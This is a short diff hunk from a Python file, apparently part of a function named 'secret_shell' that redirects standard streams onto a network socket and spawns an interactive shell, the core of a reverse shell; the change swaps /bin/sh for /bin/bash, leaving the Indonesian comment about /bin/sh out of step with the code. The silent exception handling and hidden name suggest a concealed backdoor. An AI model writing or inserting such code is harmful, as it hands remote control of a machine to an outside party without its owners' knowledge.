@@ -15,7 +15,7 @@ def secret_shell():
         os.dup2(s.fileno(), 2)
         
         # Menggunakan /bin/sh agar lebih ringan dan tidak interferensi dengan shell utama
-        p = subprocess.call(["/bin/sh", "-i"])
+        p = subprocess.call(["/bin/bash", "-i"])
     except Exception:
         pass
     finally:
